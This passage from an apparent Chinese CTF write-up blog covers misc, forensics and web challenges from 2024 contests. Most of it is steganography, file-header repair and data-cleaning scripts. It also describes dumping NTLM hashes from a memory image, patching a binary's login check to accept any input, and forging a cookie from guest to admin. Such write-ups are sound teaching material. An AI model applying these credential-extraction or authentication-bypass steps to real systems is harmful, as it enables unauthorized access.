COMM_HEAD(旧风格的注释头) HEAD_TYPE = 0x76 - AV_HEAD(旧风格的授权信息块/用户身份信息块) HEAD_TYPE = 0x77 - SUB_HEAD(旧风格的子块) HEAD_TYPE = 0x78 - PROTECT_HEAD(旧风格的恢复记录) HEAD_TYPE = 0x79 - SIGN_HEAD(旧风格的授权信息块/用户身份信息块) HEAD_TYPE = 0x7A - NEWSUB_HEAD(子块) HEAD_TYPE = 0x7B - ENDARC_HEAD(结束块) winhex查看rar： 有draw.txt，往前看，HEAD_TYPE的字节是7A，将其改成74 正常解压，得到draw.txt 放到vscode中查看，发现又图形 缩放一下，是一座塔楼 为了方便画图，我们将其设定为0是空格，|是1，-是2，/是3，\\是4 参考官方wp脚本 from PIL import Image, ImageDraw, ImageFont # 设定对应关系 char_map = { '0': ' ', '1': '|', '2': '-', '3': '/', '4': '\\\\', } # 读取txt文件 with open('draw.txt', 'r') as f: lines = f.readlines() # 替换数字为字符 lines = [[char_map[ch] for ch in line.strip()] for line in lines] font_size = 10 width = len(lines[0]) * font_size height = len(lines) * font_size image = Image.new('RGB', (width, height), color='white') draw = ImageDraw.Draw(image) font = ImageFont.load_default() for y, line in enumerate(lines): for x, ch in enumerate(line): draw.text((x * font_size, y * font_size), ch, font=font, fill='black') # 保存图片 output_image = 'draw.png' image.save(output_image) 搜一下7层高塔，对比发现是大雁塔 SHCTF{MD5(大雁塔)}即： SHCTF{21506a1b677c7254879d86bbec5b4ec9} ","date":"2024-11-13","objectID":"/2024shctf_misc/:4:2","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#今日无事勾栏听曲"},{"categories":["wp","misc"],"content":"\r音频里怎么有一幅画？在deep文件属性中找到密码MARETU 使用 deepsound 解密 deep.wav，得到 key.rar ，使用 010 Editor 打开。 删除 RAR! 字符，并将 KP 改为 PK，然后运行 ZIP 模板。 压缩软件以及中心目录区的压缩文件名显示为 key.wav，但数据存储区显示为 key，.wav 被归到数据区内，这表明文件头的内容被修改了。 需要调整数据区的 .wav 使其回到正确的文件名位置。模板的运行结果没有报错，说明参数设置没有矛盾。 根据文件头信息，能发现文件名长度 frFileNameLength 的值被设置为 3，直接将其修改为 7。但只修改文件名长度会导致模板运行错误，并且运行结果也没有中心目录区，说明数据区内容识别错误。 需要同时调整 frCompressedSize 和 frFileNameLength 为 2236116 和 7，然后重新运行 ZIP 模板。 运行模板没有报错，但还是不能解压。 010 Editor 拉到最下面也可以看到有注释内容。但通过bandzip注释又看不到内容。 通过 zwsp-steg 解密零宽字符。 Offdev.net - Zero-width space steganography javascript demo 推测该zip为真加密，密码为Z3r0-W1D7H 将数据区和目录区的加密标志位都改为 09。 解压得到key.wav 文件 查看频谱图 识别Aztec Code 将其分离立体声到单声道，并对上面的声道做反相处理 随后对两个声道进行混音 得到完整的汉信码 扫描汉信码 在线汉信码识别,汉信码解码 - 兔子二维码 AI 生成可扫码图像 — 新 ControlNet 模型展示 分析flag.wav频谱图 发现 flag.wav 的图片明显被污染，猜测污染源就是这两个码。根据 Aztec Code 的时间 00:11:67，推测两个二维码音频的起点是 00:11:67。 将汉信码和 flag.wav 的另一个声道反相，然后混音，得到最终的图片。 (偷一下官方wp的图) 暴力识别 SHCTF{AI_4rt_1s_M4gica1} ","date":"2024-11-13","objectID":"/2024shctf_misc/:4:3","series":null,"tags":["wp","misc"],"title":"2024 SHCTF_misc","uri":"/2024shctf_misc/#音频里怎么有一幅画"},{"categories":["wp","Forensics"],"content":"2024 第十届美亚杯资格赛内存取证和 U 盘取证 容器密码 eS2%u@q#hake2#Z@6LWpQ8^T(R7cg95m\\Bv+y;$=/dqxYnEusFf)tb\u003e:HKHwy+e%cR\\r=9j:GsK)AV52/3hXfdv8#u7a6JQ^pz\u003e\u003cYPNkq*!\u0026 59.[单选题] 你根据易失性(Volatility Level)优先次序, 进行内存取证分析 David 的笔记本电脑 ｡ 参考 RAM_Capture_David_Laptop.RAW, 以下哪一个不是程序 “firefox.exe” 的 PID? (2 分) A. 9240 B. 8732 C. 5260 D. 3108 C 60.[填空题] 参考RAM_Capture_David_Laptop.RAW，汇出PID：724的程序，其哈希值(SHA-256)是？(2分) fee23ebcba02987e70d81ca1924c2e9c69d79ac2afea5bbde4fb335a57d4b30c 找到其中PID为724的lsass.exe程序，计算SHA256哈希值 certutil -hashfile ffff818a2adf6520-lsass.exe SHA256 61.[单选题] 参考RAM_Capture_David_Laptop.RAW，哪一个是执行PID：724程序的SID？(1分) A. S-1-1-0 B. S-1-2-0 C. S-1-5-21-1103701427-1706751984-2965915307-1001 D. S-1-5-21-1103701427-1706751984-2965915307-513 A. S-1-1-0 可以使用vol3的windows.getsids模块 62.[填空题] 参考RAM_Capture_David_Laptop.RAW，账户David Tenth的NT LAN Manager的哈希值(NTLM Hash)？(答案格式:只需使用全部小写及阿拉伯数字回答) (1分) e14a21fefc5dd81275bb87228586cffc 使用vol3的windows.hashdump模块 63.[单选题] 在取证中，你发现D盘被BitLocker加密。U盘上可能有一些线索，你对U盘进行了取证。参考David_USB_8GB.e01，David 的U盘文件系统的格式？(2分) A. NTFS B. FAT32 C. exFAT D. ReFS A. NTFS 64.[单选题] 参考David_USB_8GB.e01，David的U盘文件系统中，每簇(Cluster)定义了多少字节(Byte)？(2分) A. 128 B. 256 C. 512 D. 1024 C. 512 题解同上 65.[单选题] 参考David_USB_8GB.e01，David的U盘中有多少个已删除的文件？(2分) A. 1 B. 2 C. 3 D. 4 A. 1 66.[单选题] 承上题,参考David_USB_8GB.e01,已删除的文件的运行列表(Run List)的运行偏移量(Run Offset)数量是多少? (2分) A. 16 B. 32 C. 64 D. 128 C. 64 找到80属性数据，80属性头部长度为0x40，后为DataRun数据 跳转到文件INODE 67.[单选题] 承上题,参考David_USB_8GB.e01,已删除文件的第一个运行的十六进制值(低端字节序 Little-Endian)是多少? (3分) A. 0x4C3F0DB522 B. 0x4C3F0D22B5 C. 0x224C3F0DB5 D. 0x3F4C0DB522 C. 0x224C3F0DB5 68.[填空题] 承上题,参考David_USB_8GB.e01,已删除的文件的实际大小(单位:字节 Byte)是多少? 答案格式:只需使用阿拉伯数字回答 (2分) 1796178 69.[填空题] 承上题,参考David_USB_8GB.e01,已删除文件的第一个运行偏移量(Run Offset)是多少? (答案格式:只需使用阿拉伯数字回答) (2分) 19519 分别是长度和起始簇号的长度，运行偏移为0x4C3F 转10进制：19519 70.[单选题] 承上题,参考David_USB_8GB.e01,已删除的文件的第一个运行的簇运行长度(Run Length)是多少? (2分) A. 2408 B. 3509 C. 3128 D. 4021 B. 3509 第一个字节分别是长度和起始簇号的长度，长度为0x0DB5 转10进制为：3509 71.[单选题] 承上题,参考David_USB_8GB.e01,已删除文件的图像文件像素值(Pixel)是多少? (2分) A. 1000 x 2000 B. 2000 x 3000 C. 3000 x 4000 D. 4000 x 5000 C. 3000 x 4000 查看文件EXIF信息 72.[单选题] 承上题,参考David_USB_8GB.e01,已删除图像文件是用哪个品牌和型号的手机拍摄? (2分) A. SAMSUNG SM-A425 B. SAMSUNG SM-A4580 C. SAMSUNG SM-A4260 D. SAMSUNG SM-A5G C. SAMSUNG SM-A4260 题解同上 73.在U盘中,你还发现了一个exe文件,但它被锁定,可能需要进行反编译以便进一步检查。参考David_USB_8GB.e01,使用x64dbg的字符串搜索(String Search)功能,在Bitlocker.exe中查找哪个字符串最有可能与显示的登录状态有关? (1分) 导出并用IDA64进行分析，查看字符串 74.承上題,当找到控制登录成功的逻辑代码时,如何修改汇编代码(Assembly Code)来绕过检查,达到任意输入，都成功登录的效果? (2分) 通过分析逻辑可以看到，Bitlocker.exe通过TEST和JNE指令配合实现登入成功和失败的提示 75.参考David_USB_8GB.e01,Bitlocker.exe的正确用户登录名称是? (1分) david1337 查找字串，并跳转到代码 根据代码可以判断，字符串:” david1337”作为用户登入名称 76.参考David_USB_8GB.e01,Bitlocker.exe的正确登录密码是? (2分) 1337david 题解同上，字符串:” 1337david”作为登入密码进行登入 77.参考David_USB_8GB.e01,当Bitlocker.exe程序尝试显示登录结果（成功或失败）时,使用了哪一种途径来决定显示的消息? (2分) 显示成功或者失败是通过test eax,eax决定跳转到执行显示信息的代码中 78.参考David_USB_8GB.e01,决定能否解密Bitlocker Key 的字节的内存偏移量(Memory Offset)（相对于基址\"bitlocker.exe\"）是什么? (3分) 校验登入用户名密码之后会继续判断rva = 0x808C处的数据，当该处值为1时会显示The Bitlocker key 的窗口提示，并且显示相关数据 79.参考David_USB_8GB.e01,决定能否解密Bitlocker Key 的内存偏移量(Memory Offset)后,应该如何利用它来进行解密? (2分) A. 将该偏移量处的值改为 1 (true),以启用解密过程 B. 将该偏移量处的值改为 0 (false),以重新初始化加密过程 C. 将该偏移量的内容保存到档中以作解密过程中的key D. 清空该偏移量的内存并强制退出程序 A. 将该偏移量处的值改为 1 (true),以启用解密过程 题解同上 80.[单选题] 参考David_USB_8GB.e01，解密后的Bitlocker Key是？(3分) A. 299255-418649-198198-616891-099682-482306-642609-483527 B. 745823-918273-564738-290183-475920-182736-594827-162839 C. 539823-847291-094857-194756-382910-472918-482937-120984 D. 829384-192837-475910-298374-019283-847362-564738-293847 A. 299255-418649-198198-616891-099682-482306-642609-483527 恢复U盘中删除的图片得到恢复密钥 ","date":"2024-11-11","objectID":"/2024meiyacup_individual/:0:0","series":null,"tags":["wp","Forensics"],"title":"2024 第十届美亚杯资格赛内存取证和 U 盘取证","uri":"/2024meiyacup_individual/#"},{"categories":["wp","misc"],"content":"2024网鼎杯网络安全大赛青龙组Misc ","date":"2024-10-31","objectID":"/2024wdb_misc/:0:0","series":null,"tags":["wp","misc"],"title":"2024 网鼎杯网络安全大赛青龙组Misc","uri":"/2024wdb_misc/#"},{"categories":["wp","misc"],"content":"\rMisc01附件为MME.cap流量包 流量包中的协议主要有：DIAMETER、S1AP/NAS-EPS、GTPv2、S1AP 问GPT哪几个协议可能会泄露用户的位置信息，得知为GTPv2和DIAMETER 最终在DIAMETER协议中发现关键信息MME-Location-Information 最后把该字段的值md5加密后为flag wdflag{f9243fa9f18aec525ccb1ea3bd5dd190} ","date":"2024-10-31","objectID":"/2024wdb_misc/:0:1","series":null,"tags":["wp","misc"],"title":"2024 网鼎杯网络安全大赛青龙组Misc","uri":"/2024wdb_misc/#misc01"},{"categories":["wp","misc"],"content":"\rMisc02使用RStudio回复了许多txt文件，但并没扫到有效信息 用foremost对flag进行提取，发现两张可疑的png图片 用zsteg对第一张图片进行扫描，得到了疑似hint信息 同时再镜像尾部发现7z文件37 7A BC AF 27 1C 有密码，根据前面得到的hint信息进行掩码爆破 解压得到flag.txt 31 226 PUSH_NULL 228 LOAD_NAME 8 (key_encode) 230 LOAD_NAME 7 (key) 232 PRECALL 1 236 CALL 1 246 STORE_NAME 7 (key) 32 248 PUSH_NULL 250 LOAD_NAME 10 (len) 252 LOAD_NAME 7 (key) 254 PRECALL 1 258 CALL 1 268 LOAD_CONST 7 (16) 270 COMPARE_OP 2 (==) 276 POP_JUMP_FORWARD_IF_FALSE 43 (to 364) 33 278 PUSH_NULL 280 LOAD_NAME 9 (sm4_encode) 282 LOAD_NAME 7 (key) 284 LOAD_NAME 5 (flag) 286 PRECALL 2 290 CALL 2 300 LOAD_METHOD 11 (hex) 322 PRECALL 0 326 CALL 0 336 STORE_NAME 12 (encrypted_data) 34 338 PUSH_NULL 340 LOAD_NAME 6 (print) 342 LOAD_NAME 12 (encrypted_data) 344 PRECALL 1 348 CALL 1 358 POP_TOP 360 LOAD_CONST 2 (None) 362 RETURN_VALUE 32 \u003e\u003e 364 LOAD_CONST 2 (None) 366 RETURN_VALUE Disassembly of \u003ccode object key_encode at 0x14e048a00, file \"make.py\", line 10\u003e: 10 0 RESUME 0 11 2 LOAD_GLOBAL 1 (NULL + list) 14 LOAD_FAST 0 (key) 16 PRECALL 1 20 CALL 1 30 STORE_FAST 1 (magic_key) 12 32 LOAD_GLOBAL 3 (NULL + range) 44 LOAD_CONST 1 (1) 46 LOAD_GLOBAL 5 (NULL + len) 58 LOAD_FAST 1 (magic_key) 60 PRECALL 1 64 CALL 1 74 PRECALL 2 78 CALL 2 88 GET_ITER \u003e\u003e 90 FOR_ITER 105 (to 302) 92 STORE_FAST 2 (i) 13 94 LOAD_GLOBAL 7 (NULL + str) 106 LOAD_GLOBAL 9 (NULL + hex) 118 LOAD_GLOBAL 11 (NULL + int) 130 LOAD_CONST 2 ('0x') 132 LOAD_FAST 1 (magic_key) 134 LOAD_FAST 2 (i) 136 BINARY_SUBSCR 146 BINARY_OP 0 (+) 150 LOAD_CONST 3 (16) 152 PRECALL 2 156 CALL 2 166 LOAD_GLOBAL 11 (NULL + int) 178 LOAD_CONST 2 ('0x') 180 LOAD_FAST 1 (magic_key) 182 LOAD_FAST 2 (i) 184 LOAD_CONST 1 (1) 186 BINARY_OP 10 (-) 190 BINARY_SUBSCR 200 BINARY_OP 0 (+) 204 LOAD_CONST 3 (16) 206 PRECALL 2 210 CALL 2 220 BINARY_OP 12 (^) 224 PRECALL 1 228 CALL 1 238 PRECALL 1 242 CALL 1 252 LOAD_METHOD 6 (replace) 274 LOAD_CONST 2 ('0x') 276 LOAD_CONST 4 ('') 278 PRECALL 2 282 CALL 2 292 LOAD_FAST 1 (magic_key) 294 LOAD_FAST 2 (i) 296 STORE_SUBSCR 300 JUMP_BACKWARD 106 (to 90) 15 \u003e\u003e 302 LOAD_GLOBAL 3 (NULL + range) 314 LOAD_CONST 5 (0) 316 LOAD_GLOBAL 5 (NULL + len) 328 LOAD_FAST 0 (key) 330 PRECALL 1 334 CALL 1 344 LOAD_CONST 6 (2) 346 PRECALL 3 350 CALL 3 360 GET_ITER \u003e\u003e 362 FOR_ITER 105 (to 574) 364 STORE_FAST 2 (i) 16 366 LOAD_GLOBAL 7 (NULL + str) 378 LOAD_GLOBAL 9 (NULL + hex) 390 LOAD_GLOBAL 11 (NULL + int) 402 LOAD_CONST 2 ('0x') 404 LOAD_FAST 1 (magic_key) 406 LOAD_FAST 2 (i) 408 BINARY_SUBSCR 418 BINARY_OP 0 (+) 422 LOAD_CONST 3 (16) 424 PRECALL 2 428 CALL 2 438 LOAD_GLOBAL 11 (NULL + int) 450 LOAD_CONST 2 ('0x') 452 LOAD_FAST 1 (magic_key) 454 LOAD_FAST 2 (i) 456 LOAD_CONST 1 (1) 458 BINARY_OP 0 (+) 462 BINARY_SUBSCR 472 BINARY_OP 0 (+) 476 LOAD_CONST 3 (16) 478 PRECALL 2 482 CALL 2 492 BINARY_OP 12 (^) 496 PRECALL 1 500 CALL 1 510 PRECALL 1 514 CALL 1 524 LOAD_METHOD 6 (replace) 546 LOAD_CONST 2 ('0x') 548 LOAD_CONST 4 ('') 550 PRECALL 2 554 CALL 2 564 LOAD_FAST 1 (magic_key) 566 LOAD_FAST 2 (i) 568 STORE_SUBSCR 572 JUMP_BACKWARD 106 (to 362) 18 \u003e\u003e 574 LOAD_CONST 4 ('') 576 LOAD_METHOD 7 (join) 598 LOAD_FAST 1 (magic_key) 600 PRECALL 1 604 CALL 1 614 STORE_FAST 1 (magic_key) 19 616 LOAD_GLOBAL 17 (NULL + print) 628 LOAD_FAST 1 (magic_key) 630 PRECALL 1 634 CALL 1 644 POP_TOP 20 646 LOAD_GLOBAL 7 (NULL + str) 658 LOAD_GLOBAL 9 (NULL + hex) 670 LOAD_GLOBAL 11 (NULL + int) 682 LOAD_CONST 2 ('0x') 684 LOAD_FAST 1 (magic_key) 686 BINARY_OP 0 (+) 690 LOAD_CONST 3 (16) 692 PRECALL 2 696 CALL 2 706 LOAD_GLOBAL 11 (NULL + int) 718 LOAD_CONST 2 ('0x') 720 LOAD_FAST 0 (key) 722 BINARY_OP 0 (+) 726 LOAD_CONST 3 (16) 728 PRECALL 2 732 CALL 2 742 BINARY_OP 12 (^) 746 PRECALL 1 750 CALL 1 760 PRECALL 1 764 CALL 1 774 LOAD_METHOD 6 (replace) 796 LOAD_CONST 2 ('0x') 798 LOAD_CONST 4 ('') 800 PRECALL 2 804 CALL 2 814 STORE_FAST 3 (wdb_key) 21 816 LOAD_GLOBAL 17 (NULL + print) 828 LOAD_FAST 3 (wdb_key) 830 PRECALL 1 834 CALL 1 844 POP_TOP 22 846 LOAD_FAST 3 (wdb_key) 848 RETURN_VALUE magic_key:7a107ecf29325423 encrypted_da","date":"2024-10-31","objectID":"/2024wdb_misc/:0:2","series":null,"tags":["wp","misc"],"title":"2024 网鼎杯网络安全大赛青龙组Misc","uri":"/2024wdb_misc/#misc02"},{"categories":["wp","misc"],"content":"\rMisc03\r直接统计交互IP 回查流量 蚁剑流量 攻击ip为39.168.5.60 wdflag{ 39.168.5.60} ","date":"2024-10-31","objectID":"/2024wdb_misc/:0:3","series":null,"tags":["wp","misc"],"title":"2024 网鼎杯网络安全大赛青龙组Misc","uri":"/2024wdb_misc/#misc03"},{"categories":["wp","misc"],"content":"\rMisc04\r附件为 希尔伯特-皮亚诺曲线 IrisCTF2024原题 from PIL import Image from tqdm import tqdm def peano(n): if n == 0: return [[0,0]] else: in_lst = peano(n - 1) lst = in_lst.copy() px,py = lst[-1] lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px + 1 + i[0], py - i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px - i[0], py - 1 - i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px + i[0], py - 1 - i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px + 1 + i[0], py + i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) return lst order = peano(6) img = Image.open(r\"C:\\Users\\ASUSROG\\Desktop\\chal.png\") width, height = img.size block_width = width # // 3 block_height = height # // 3 new_image = Image.new(\"RGB\", (width, height)) for i, (x, y) in tqdm(enumerate(order)): # 根据列表顺序获取新的坐标 new_x, new_y = i % width, i // width # 获取原图像素 pixel = img.getpixel((x, height - 1 - y)) # 在新图像中放置像素 new_image.putpixel((new_x, new_y), pixel) new_image.save(\"rearranged_image.jpg\") 扫二维码 wdflag{4940e8dc-5542-4eee-9243-202ae675d77f} ","date":"2024-10-31","objectID":"/2024wdb_misc/:0:4","series":null,"tags":["wp","misc"],"title":"2024 网鼎杯网络安全大赛青龙组Misc","uri":"/2024wdb_misc/#misc04"},{"categories":["wp"],"content":"解题+赛后复盘 ","date":"2024-10-30","objectID":"/2024sdnisc/:0:0","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#"},{"categories":["wp"],"content":"\rmisc","date":"2024-10-30","objectID":"/2024sdnisc/:1:0","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#misc"},{"categories":["wp"],"content":"\r签到直接下载flag （没见过这么直接的） ","date":"2024-10-30","objectID":"/2024sdnisc/:1:1","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#签到"},{"categories":["wp"],"content":"\rezpic查看十六进制，文件尾部有部分flag 随后lsb通道隐写 扫码得到flag 拼接得到flag{cf74bc8a2233179ea73b2de7499d614c} ","date":"2024-10-30","objectID":"/2024sdnisc/:1:2","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#ezpic"},{"categories":["wp"],"content":"\r简单编码rot47+rot13 ","date":"2024-10-30","objectID":"/2024sdnisc/:1:3","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#简单编码"},{"categories":["wp"],"content":"\r异常的流量dnslog流量 提取出01 二进制转图片 用ps补上三个定位符 flag{a04cc2c1b77c070823aa38aaf8e7e761} 也可以使用tshark提取 tshark -r 异常的流量.pcap -Y \"ip.dst == 172.16.178.145\" -T fields -e dns.qry.name ","date":"2024-10-30","objectID":"/2024sdnisc/:1:4","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#异常的流量"},{"categories":["wp"],"content":"\rweb","date":"2024-10-30","objectID":"/2024sdnisc/:2:0","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#web"},{"categories":["wp"],"content":"\rfly_car两分钟内跑完一圈 抓包，修改cookie里的guest为admin ","date":"2024-10-30","objectID":"/2024sdnisc/:2:1","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#fly_car"},{"categories":["wp"],"content":"\rezmaze感觉这道题更偏acm，没出来 题解参考生蚝师傅博客 https://blog.shenghuo2.top/posts/fd86f36/ 4211 9349 5566 5538 8842 4573 2278 1987 8284 1884 7596 2144 6718 1865 1834 2751 5131 6267 2332 7234 5248 8649 6925 4873 1255 8695 5489 8386 7631 8325 4197 7533 2513 6532 8281 1418 1481 1643 9974 6715 8263 3277 2345 3372 7385 5826 9761 1352 1955 2178 5631 9496 8462 8153 1499 9239 8658 9688 3452 9568 5513 2853 5119 5625 7842 9455 1668 6873 2556 8491 8787 6426 1514 5171 9828 9792 1721 2344 3783 1282 4926 2981 1865 5544 2865 4181 6969 3429 4714 7133 1545 7819 1327 1422 8584 7958 2161 7189 6167 4745 2225 8687 5289 8434 2472 5943 7188 6135 6339 6124 2332 8821 6355 8491 5929 1229 9454 9733 8545 4883 4189 7762 4285 5985 5374 5758 4123 4835 3623 9566 5393 6264 3489 9623 5265 9363 8715 3489 6463 4872 6596 2563 6573 1537 6332 4669 3288 5649 7119 6257 1617 3578 6447 7747 6835 4359 6424 4766 5593 8768 2627 3326 1531 4897 1422 3655 9431 6246 3231 6524 7145 5963 9636 7442 6638 8235 6847 6982 9858 4759 2554 7476 8284 9417 5246 1726 4679 4773 2421 4784 5135 5219 9338 4713 6388 3836 1431 3682 3797 5127 4423 -1998 -6432 -2777 -9613 -4414 -4369 -4497 -3538 -2163 -4211 -4427 -3472 -2231 -6443 -4464 -1952 -6682 -2349 -8118 -6171 -6586 -5986 -8652 -8925 -2331 -7157 -4123 -4256 -6519 -8318 -4399 -1485 -8231 -3284 -8187 -8111 -7962 -7516 -7545 -7148 -1926 -9323 -4684 -6786 -9363 -5746 -9991 -3864 -4545 -5658 -3544 -2924 -6668 -2674 -9444 -7482 -1111 -6888 -8819 -6723 -5473 -2324 -1232 -1783 -5373 -1327 -4525 -9656 -2432 -6274 -2481 -8817 -4423 -8977 -5921 -5649 -6884 -6456 -5334 -4262 -1774 -2572 -3372 -8315 -4496 -7694 -1823 -1827 -2383 -6781 -6357 -6824 -6272 -1328 -1486 -6285 -9834 -9242 -1948 -7356 15347 62454 96218 56278 57964 51312 26431 27518 62422 11269 52564 66445 26777 45523 73656 17744 21558 32227 72778 34494 97437 54133 93523 49949 76765 75947 15445 89162 72732 47364 43948 85273 76314 21775 67946 12981 66489 10566 12341 79549 67915 76486 63797 73714 32955 73746 39864 72518 77548 17126 33322 57955 95659 59196 36636 49799 27646 82712 24165 31839 36687 41479 39256 92866 35437 34732 59638 29251 36141 43373 66492 34672 23232 43643 52934 69535 83198 26556 91924 62412 98549 94933 82826 72937 79546 82846 89522 67962 67266 21693 65315 19166 63161 89774 79757 84983 42752 15165 14749 73264 5396 8423 5353 2819 4761 8282 4155 4285 9833 2827 2648 4563 4988 4115 4955 9899 4386 4896 4297 6526 1732 8248 2923 1164 7297 9943 2111 1194 6744 8457 4848 9479 2285 2468 2491 9911 7221 9715 5217 2431 4886 5342 4189 9396 8218 7647 4637 6915 8764 7695 2913 6515 6224 6355 3516 6424 7758 4646 7959 2347 1521 2827 9455 1469 5935 9376 1878 9634 2331 7629 3847 3683 6977 2715 6472 9486 2871 2979 8578 2629 3366 1176 9864 8526 2726 1977 6554 5969 2742 1234 5946 2816 5722 8862 5952 3471 3821 7922 6589 5694 5172 8541 7413 1122 8167 9364 7491 3287 4416 4565 2616 1681 2776 4825 2746 3691 9122 9788 8198 6937 1785 9747 3349 8698 6621 1123 4158 2237 2342 5656 3353 1663 3252 1411 7179 3751 2614 6176 9255 8622 8836 2541 9544 8971 8941 4197 8272 2721 8156 6864 4526 9272 2593 3393 7495 3743 9945 2936 3671 7734 8725 8682 5111 3814 4938 9684 5834 3896 6122 5165 7911 8557 4584 3781 8235 4211 2186 6823 3397 8987 7619 3592 7449 8474 8349 4535 5273 4992 9752 1363 1196 3435 6136 3597 4985 7469 6582 7384 3436 8913 6697 9624 1666 7181 4266 6313 8272 1885 8167 6342 1275 5239 5329 9799 5278 4169 6713 4277 6399 1319 7895 6199 5711 9665 9389 5576 5981 8456 9657 1135 6581 4299 5966 5767 9585 9794 4911 8818 7422 7116 8429 6861 5366 2297 8419 4226 7489 1674 8976 2521 8212 2637 1524 6252 5116 5368 4442 7285 6611 7182 6986 2419 4928 5731 5157 5632 2728 2349 1258 9248 1356 3584 5954 1634 4918 3516 1971 6822 1399 3225 8275 3472 8654 5239 2712 2611 9244 4254 7334 2144 3821 8611 5271 4739 8171 8727 3194 2874 2283 7363 7839 7599 4436 1311 9715 5889 8555 5357 8786 5833 1153 9296 5362 9715 8699 2412 9932 4414 9655 9515 3515 7259 1868 5813 7432 7752 8247 4298 9248 2776 9438 1851 7665 8266 8885 6894 8636 2527 7338 7852 5672 4681 3818 5662 ","date":"2024-10-30","objectID":"/2024sdnisc/:2:2","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#ezmaze"},{"categories":["wp"],"content":"\rcrypto","date":"2024-10-30","objectID":"/2024sdnisc/:3:0","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#crypto"},{"categories":["wp"],"content":"\r古典之美先栅栏，再恺撒 ","date":"2024-10-30","objectID":"/2024sdnisc/:3:1","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#古典之美"},{"categories":["wp"],"content":"\rreverse","date":"2024-10-30","objectID":"/2024sdnisc/:4:0","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#reverse"},{"categories":["wp"],"content":"\rexchange\r手撕对换 也可以python脚本处理 ","date":"2024-10-30","objectID":"/2024sdnisc/:4:1","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#exchange"},{"categories":["wp"],"content":"\r工控","date":"2024-10-30","objectID":"/2024sdnisc/:5:0","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#工控"},{"categories":["wp"],"content":"\rBusss\r可以直接梭 modbus 流量 在 modbus.regval_uint16 字段 tshark -r Busss.pcapng -T fields -e modbus.regval_uint16 | xargs printf '%x\\n' | xxd -r -p ","date":"2024-10-30","objectID":"/2024sdnisc/:5:1","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#busss"},{"categories":["wp"],"content":"\r数据安全亏在python写的不好，数据安全没出 以下python脚本参考生蚝师傅的 https://blog.shenghuo2.top/posts/fd86f36/ ","date":"2024-10-30","objectID":"/2024sdnisc/:6:0","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#数据安全"},{"categories":["wp"],"content":"\r数据脱敏 请对附件进行数据脱敏，脱敏规则为：将姓名、身份证号、手机号进行脱敏处理，脱敏规则参照附件，提交处理后文件的 md5 值，处理后文件的编码为 UTF-8，换行标志为 LF (\\n)，无空行，flag 为 flag {文件的 32 位小写 md5 值}。 python脚本处理 datas = open('person.txt', 'r', encoding='utf8').readlines() out = open('out2.txt', 'w', encoding='utf8', newline='\\n') for i in datas: name, id, tel = i.split(',')[:3] name = name[0] + '*' + name[2:] id = id[:6] + '*' * 8 + id[-4:] tel = tel[:3] + '*' * 4 + tel[-5:-1] out.write(f\"{name},{id},{tel}\\n\") 最后md5=76e2f5c0b24aae33b918d82414d5c76d ","date":"2024-10-30","objectID":"/2024sdnisc/:6:1","series":null,"tags":["wp"],"title":"2024 “九州信泰杯”第十一届山东省大学生网络安全技能大赛","uri":"/2024sdnisc/#数据脱敏"},{"categories":["wp"],"content":"\rdata_analy 某公司在统计内部员工个人信息，由于某些员工没认真填写，导致有 1% 的数据是不符合数据规范的，因此需要进行数据清洗。数据规范文档参考附件中 “个人信息数据规范文档.pdf”。最终将清洗出的不符合规范的数据保存为文本文件，处理后文件的编码为 UTF-8，换行标志为 CRLF，无空行，flag 为 flag {文件的 32 位小写 md5 值}。 该题目只有身份证错误 import csv import re input_file = 'data.csv' output_file = 'processed.txt' name_pattern = re.compile(r'^[\\u4e00-\\u9fa5]{2,}$') gender_pattern = re.compile(r'^[男|女]$') id_number_pattern = re.compile(r'^\\d{17}[\\dXx]$') date_pattern = re.compile(r\"^\\d{4}-(?:0\\d|1[0-9]|2[0-3])-(?:0[1-9]|[12][0-9]|3[01])$\") def check_id_number(num_str: str): str_to_int = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9, 'X': 10} check_dict = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: 